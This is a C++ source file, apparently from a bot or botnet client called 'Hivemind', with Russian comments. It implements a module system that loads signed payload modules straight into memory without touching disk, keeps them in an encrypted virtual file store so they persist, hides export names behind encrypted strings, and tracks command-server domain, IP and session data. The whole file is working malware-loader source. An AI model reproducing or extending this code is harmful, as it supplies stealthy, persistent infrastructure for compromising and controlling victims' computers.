#include "modulesystem.hpp"

HivemindModuleSystem::HivemindModuleSystem()
{
#ifdef _DEBUG
	WriteLog(L"[HivemindModuleSystem] constructor");
#endif
	this->ctx = nullptr;
	this->evfs = nullptr;
	this->bInitialized = FALSE;
	this->mlist = nullptr;
	RtlSecureZeroMemory(&this->loader_ctx, sizeof(this->loader_ctx));
}

HivemindModuleSystem::~HivemindModuleSystem()
{
#ifdef _DEBUG
	WriteLog(L"[HivemindModuleSystem] destructor");
#endif
	this->bInitialized = FALSE;
	// освобождения ctx не требуется
	if (ctx != nullptr)
	{
		EnterCriticalSection(&ctx->critSect);
		ctx->lock_status = module_data::msystem_status_t::MODULESYSTEM_HALT;
		LeaveCriticalSection(&ctx->critSect);
	}
	if (this->evfs != nullptr)
	{
		delete this->evfs;
		this->evfs = nullptr;
	}

	// ВАЖНО: тут не нужно входа в крит. секции, так как сам по себе free_modulelist входит в них, иначе мы получим дедлок
	if (mlist != nullptr)
		this->free_modulelist();

}

BOOL HivemindModuleSystem::init()
{
#ifdef _DEBUG
	WriteLog(L"[HivemindModuleSystem::init] initializing module system");
#endif

	BOOL bRet = FALSE;
	do
	{
		if ((this->ctx != nullptr) || (this->bInitialized == TRUE))
			break;

		if (!resolve_functions(&this->loader_ctx))
			break;

		this->ctx = new module_data::msys_context;
		if (this->ctx == nullptr)
			break;

		RtlSecureZeroMemory(this->ctx, sizeof(module_data::msys_context));
		InitializeCriticalSection(&this->ctx->critSect);
		this->ctx->lock_status = module_data::MODULESYSTEM_SUSPEND;
		this->ctx->send = module_api::send;
		this->ctx->lock_mlist = &this->mlist;

		this->evfs = (IEncryptedVirtualFS*)new HivemindModuleStorageSystem;
		if (this->evfs == nullptr)
			break;

		if (this->evfs->init() != evfs_status_t::EVFS_STATUS_INIT_OK)
		{
#ifdef _DEBUG
			WriteLog(L"[HivemindModuleSystem::init] error initializing VFS");
#endif
			break;
		}

		bRet = TRUE;
		this->bInitialized = TRUE;

	} while (FALSE);
	return bRet;
}

BOOL HivemindModuleSystem::load_persistent()
{
#ifdef _DEBUG
	WriteLog(L"[HivemindModuleSystem::load_persistent] loading modules from VFS container");
	WCHAR debugOut[1024];
#endif

	if ((this->evfs == nullptr) || (this->ctx == nullptr))
		return FALSE;

	BOOL bRet = TRUE;

	UINT iAmountFiles = this->evfs->amount();
	SIZE_T dwHeaderSize = 0;

	blob blResidentBlob;
	RtlSecureZeroMemory(&blResidentBlob, sizeof(blResidentBlob));

	for (UINT iIndex = 0; iIndex < iAmountFiles; iIndex++)
	{
		_hmvfs_fileheader *hmFh = (_hmvfs_fileheader*)this->evfs->get_metadata(iIndex, &dwHeaderSize);
		if (dwHeaderSize != sizeof(_hmvfs_fileheader))
		{
#ifdef _DEBUG
			wsprintfW(debugOut, L"[HivemindModuleSystem::load_persistent] error %d-th index has invalid header size for assumed implementation", dwHeaderSize);
			WriteLog(debugOut);
#endif
			bRet = FALSE;
			break;
		}

		// загружаем только актуальные файлы (bFileOutdated == TRUE) и валидные по размеру
		if ((hmFh->bFileOutdated == FALSE) && (this->evfs->read_by_index(iIndex, &blResidentBlob) == evfs_status_t::EVFS_STATUS_READ_OK) && (blResidentBlob.dwBufSize > sizeof(module_data::resident_mdata)))
		{
#ifdef _DEBUG
			wsprintfW(debugOut, L"[HivemindModuleSystem::load_persistent] read %d-th index resident module filename = %d with size = %d", iIndex, hmFh->dwFileName, blResidentBlob.dwBufSize);
			WriteLog(debugOut);
#endif
			bRet &= this->load_resident(&blResidentBlob, FALSE);
		}

		if (blResidentBlob.lpBuffer != nullptr)
		{
			delete[]blResidentBlob.lpBuffer;
			RtlSecureZeroMemory(&blResidentBlob, sizeof(blResidentBlob));
		}

	}

	return bRet;
}

BOOL HivemindModuleSystem::load_resident(blob * pblResidentBufferBlob, BOOL bSaveModule)
{
#ifdef _DEBUG
	WriteLog(L"[HivemindModuleSystem::load_resident] loading resident module");
#endif

	if ((this->ctx == nullptr) || (pblResidentBufferBlob == nullptr) || (pblResidentBufferBlob->lpBuffer == nullptr) || (pblResidentBufferBlob->dwBufSize == 0))
		return FALSE;

	module_data::resident_mdata *pResident = (module_data::resident_mdata*)pblResidentBufferBlob->lpBuffer;

	BOOL bRet = FALSE;
	DWORD dwModuleOffset = 0;
	DWORD dwModuleSize = 0;
	LPBYTE lpSignature = nullptr;
	do
	{
		// мы грузим и валидируем только текущую архитектуру
#ifndef _WIN64
		dwModuleOffset = pResident->dwModulex86BufferOffset;
		dwModuleSize = pResident->dwModulex86Size;
		lpSignature = &pResident->bufSignaturex86[0];
#else
		dwModuleOffset = pResident->dwModulex64BufferOffset;
		dwModuleSize = pResident->dwModulex64Size;
		lpSignature = &pResident->bufSignaturex64[0];
#endif

		// проверим что модуль не выходит за пределы буфера
		if ((dwModuleOffset + dwModuleSize) > pblResidentBufferBlob->dwBufSize)
		{
#ifdef _DEBUG
			WriteLog(L"[HivemindModuleSystem::load_resident] error size of module leads to buffer overflow");
#endif
			break;
		}

		LPBYTE lpBuffer = (LPBYTE)((SIZE_T)pResident + (SIZE_T)dwModuleOffset);

		// проверим сигнатуру модуля для текущей архитектуры бота
		if (!ed25519_verify(lpSignature, lpBuffer, dwModuleSize, config_data::cfg->ed25519_module_publickey))
		{
#ifdef _DEBUG
			WriteLog(L"[HivemindModuleSystem::load_resident] ERROR: invalid signature for module with current runtime architecture");
#endif
			break;
		}
		
		// сохраним весь этот блоб резидентного модуля в VFS контейнер
		if (bSaveModule)
		{
			if (!this->save_resident(pblResidentBufferBlob))
			{
#ifdef _DEBUG
				WriteLog(L"[HivemindModuleSystem::load_resident] WARN: cant save this module to VFS, continue");
#endif
				// break не нужен не критичный проеб
			}
		}
		
		// теперь загрузим модуль текущей архитектуры в память, но только если он еще не загружен
		if (is_moduleinlist(pResident->dwModuleName))
		{
#ifdef _DEBUG
			WriteLog(L"[HivemindModuleSystem::load_resident] module has been already loaded");
#endif
			bRet = TRUE;
			break;
		}

		bRet = this->load_module_blob(lpBuffer, pResident->dwModuleName);
		if (!bRet)
		{
#ifdef _DEBUG
			WriteLog(L"[HivemindModuleSystem::load_resident] cant load module into memory");
#endif
		}

	} while (FALSE);

	return bRet;
}

BOOL HivemindModuleSystem::load_nonresident(blob * pblNonresidentBufferBlob)
{
#ifdef _DEBUG
	WriteLog(L"[HivemindModuleSystem::load_nonresident] loading nonresident module");
#endif
	
	if ((this->ctx == nullptr) || (pblNonresidentBufferBlob == nullptr) || (pblNonresidentBufferBlob->lpBuffer == nullptr) || (pblNonresidentBufferBlob->dwBufSize < sizeof(module_data::nonresident_mdata)))
		return FALSE;

	module_data::nonresident_mdata *pNonresident = (module_data::nonresident_mdata*)pblNonresidentBufferBlob->lpBuffer;
#ifndef _WIN64
	DWORD dwCurrentArch = IMAGE_FILE_MACHINE_I386;
#else
	DWORD dwCurrentArch = IMAGE_FILE_MACHINE_AMD64;
#endif

	BOOL bRet = FALSE;
	HMEMORYMODULE hModule = NULL;
	do
	{
		if (this->is_moduleinlist(pNonresident->dwModuleName))
		{
#ifdef _DEBUG
			WriteLog(L"[HivemindModuleSystem::load_nonresident] module with this name has been already loaded");
#endif
			bRet = TRUE;
			break;
		}

		if (pNonresident->dwArchitecture != dwCurrentArch)
		{
#ifdef _DEBUG
			WriteLog(L"[HivemindModuleSystem::load_nonresident] error invalid architecture");
#endif
			break;
		}


		if (!this->load_module_blob(pNonresident->bufModuleFile, pNonresident->dwModuleName))
		{
#ifdef _DEBUG
			WriteLog(L"[HivemindModuleSystem::load_nonresident] error cant load module into the memory");
#endif
			break;
		}

		bRet = TRUE;

	} while (FALSE);

	
	return bRet;
}

BOOL HivemindModuleSystem::save_resident(blob * pblResidentBufferBlob)
{
#ifdef _DEBUG
	WriteLog(L"[HivemindModuleSystem::save_resident] saving resident module to VFS container");
#endif

	if ((this->evfs == nullptr) || (pblResidentBufferBlob == nullptr) || (pblResidentBufferBlob->lpBuffer == nullptr) || (pblResidentBufferBlob->dwBufSize == 0))
		return FALSE;

	module_data::resident_mdata *pResident = (module_data::resident_mdata*)pblResidentBufferBlob->lpBuffer;
	return (evfs->write(pResident->dwModuleName, pblResidentBufferBlob) == evfs_status_t::EVFS_STATUS_WRITE_OK);
}

BOOL HivemindModuleSystem::set_status(DWORD dwStatus, LPBYTE lpAdditionalParameter)
{
	if (this->ctx == nullptr)
		return FALSE;

#ifdef _DEBUG
	switch (dwStatus)
	{
	case module_data::msystem_status_t::MODULESYSTEM_HALT:
		WriteLog(L"[HivemindModuleSystem::set_status] setting new status MODULESYSTEM_HALT");
		break;
	case module_data::msystem_status_t::MODULESYSTEM_NETWORK_ACTIVE:
		WriteLog(L"[HivemindModuleSystem::set_status] setting new status MODULESYSTEM_NETWORK_ACTIVE");
		break;
	case module_data::msystem_status_t::MODULESYSTEM_NETWORK_PENDING:
		WriteLog(L"[HivemindModuleSystem::set_status] setting new status MODULESYSTEM_NETWORK_PENDING");
		break;
	case module_data::msystem_status_t::MODULESYSTEM_SUSPEND:
		WriteLog(L"[HivemindModuleSystem::set_status] setting new status MODULESYSTEM_SUSPEND");
		break;
	}
#endif

	EnterCriticalSection(&this->ctx->critSect);

	ctx->lock_status = (module_data::msystem_status_t)dwStatus;

	// если устанавливаемый статус - это статус о том, что сеть в активном поиске, либо если дополнительные параметры равны нулю,
	// то занулим домен, ип и инфу о сессии, потому что с данный статус сигнализирует о скором обновлении этих данных
	if ((ctx->lock_status == module_data::msystem_status_t::MODULESYSTEM_NETWORK_PENDING) || (lpAdditionalParameter == nullptr))
	{
		RtlSecureZeroMemory(ctx->lock_wchDomain, sizeof(module_data::msys_context::lock_wchDomain));
		RtlSecureZeroMemory(ctx->lock_wchIP, sizeof(module_data::msys_context::lock_wchIP));
		if (ctx->lock_pwchSessionJson != nullptr)
		{
			delete[]ctx->lock_pwchSessionJson;
			ctx->lock_pwchSessionJson = nullptr;
		}
	} // иначе если доп параметры есть и статус какой-то иной, то заполним контекст нужными данными
	else if (lpAdditionalParameter != nullptr)
	{
		HivemindContextData *hmctxData = (HivemindContextData*)lpAdditionalParameter;

		if (hmctxData->pwDomain != nullptr)
			wcscpy(ctx->lock_wchDomain, hmctxData->pwDomain);
		if (hmctxData->pwIP != nullptr)
			wcscpy(ctx->lock_wchIP, hmctxData->pwIP);
		if (hmctxData->pwSessionJson != nullptr)
		{
			if (ctx->lock_pwchSessionJson != nullptr) // новая сессия - реаллок если выделено
			{
				delete[]ctx->lock_pwchSessionJson;
				ctx->lock_pwchSessionJson = nullptr;
			}
			ctx->lock_pwchSessionJson = new WCHAR[wcslen(hmctxData->pwSessionJson) + 1 + 1];
			if (ctx->lock_pwchSessionJson != nullptr)
				wcscpy(ctx->lock_pwchSessionJson, hmctxData->pwSessionJson);
		}
	}

	LeaveCriticalSection(&this->ctx->critSect);
	
	return TRUE;
}

BOOL HivemindModuleSystem::is_initialized()
{
	return this->bInitialized;
}

UINT HivemindModuleSystem::get_amount()
{
	UINT iRet = 0;

	this->lock_ctx();
	do
	{
		if (this->mlist == nullptr)
			break;

		module_data::hivemind_modulelist *pModule = this->mlist;
		while (pModule != nullptr)
		{
			iRet++;
			pModule = pModule->next;
		}

	} while (FALSE);
	this->unlock_ctx();

	return iRet;
}

IEncryptedVirtualFS *HivemindModuleSystem::get_vfs_ptr()
{
	return this->evfs;
}

BOOL HivemindModuleSystem::load_module_blob(LPBYTE lpModuleBuffer, DWORD dwFileName)
{

	CCryptString cStr_sm(ascii_cryptedstr_sm);
	CCryptString cStr_smdecorator(ascii_cryptedstr_smdecorator);

	BOOL bRet = FALSE;
	HMEMORYMODULE hModule = NULL;
	fnStartModule _sm = nullptr;
	do
	{
		hModule = MemoryLoadLibrary(&this->loader_ctx, lpModuleBuffer);
		if (hModule == NULL)
		{
#ifdef _DEBUG
			WriteLog(L"[HivemindModuleSystem::load_module_blob] error cant load module into the memory");
#endif
			break;
		}

#ifndef _WIN64
		_sm = (fnStartModule)MemoryGetProcAddress(&this->loader_ctx, hModule, cStr_smdecorator.c_str());
#else
		_sm = (fnStartModule)MemoryGetProcAddress(&this->loader_ctx, hModule, cStr_sm.c_str());
#endif

		if (_sm == nullptr)
		{
#ifdef _DEBUG
			WriteLog(L"[HivemindModuleSystem::load_module_blob] error cant import sm function");
#endif
			break;
		}

		// вызовим основную функцию модуля передав ей контекст модульной системы
		bRet = (_sm(this->ctx) == ERROR_SUCCESS);
		if (bRet)
			this->add_modulelist(hModule, dwFileName);

	} while (FALSE);

	return bRet;
}

VOID HivemindModuleSystem::free_modulelist()
{

	this->lock_ctx();

	module_data::hivemind_modulelist *pModule = this->mlist;
	while (pModule != nullptr)
	{
		module_data::hivemind_modulelist *pTmp = pModule;
		pModule = pModule->next;
		delete pTmp;
		pTmp = nullptr;
	}

	this->unlock_ctx();

	return;
}

VOID HivemindModuleSystem::add_modulelist(HMEMORYMODULE hModule, DWORD dwFileName)
{
	CCryptString cStr_gd(ascii_cryptedstr_gd);
	CCryptString cStr_gddecorated(ascii_cryptedstr_gddecorated);

#ifndef _WIN64
	fnGetData _gdExported = (fnGetData)MemoryGetProcAddress(&this->loader_ctx, hModule, cStr_gddecorated.c_str());
#else
	fnGetData _gdExported = (fnGetData)MemoryGetProcAddress(&this->loader_ctx, hModule, cStr_gd.c_str());
#endif

	this->lock_ctx();

	do
	{
		module_data::hivemind_modulelist *pModule = this->mlist;
		module_data::hivemind_modulelist *pNewEntry = new module_data::hivemind_modulelist;
		if (pNewEntry == nullptr)
			break;
		
		RtlSecureZeroMemory(pNewEntry, sizeof(module_data::hivemind_modulelist));
		pNewEntry->dwFileName = dwFileName;
		pNewEntry->hModule = hModule;
		pNewEntry->gd = _gdExported;


		if (pModule == nullptr)
		{
			this->mlist = pNewEntry;
			break;
		}

		// остановимся на последней структуре в списке не перезаписывая pModule в nullptr
		while (pModule->next != nullptr)
			pModule = pModule->next;
		// добавим инфу о еще одном модуле
		pModule->next = pNewEntry;

	} while (FALSE);

	this->unlock_ctx();

	return;
}

BOOL HivemindModuleSystem::is_moduleinlist(DWORD dwFileName)
{

	this->lock_ctx();

	module_data::hivemind_modulelist *pModule = this->mlist;
	
	BOOL bRet = FALSE;
	while (pModule != nullptr)
	{
		if (pModule->dwFileName == dwFileName)
		{
			bRet = TRUE;
			break;
		}

		pModule = pModule->next;
	}

	this->unlock_ctx();

	return bRet;
}

VOID HivemindModuleSystem::lock_ctx()
{
	if (this->ctx == nullptr)
		return;

	EnterCriticalSection(&this->ctx->critSect);

	return;
}

VOID HivemindModuleSystem::unlock_ctx()
{
	if (this->ctx == nullptr)
		return;

	LeaveCriticalSection(&this->ctx->critSect);

	return;
}
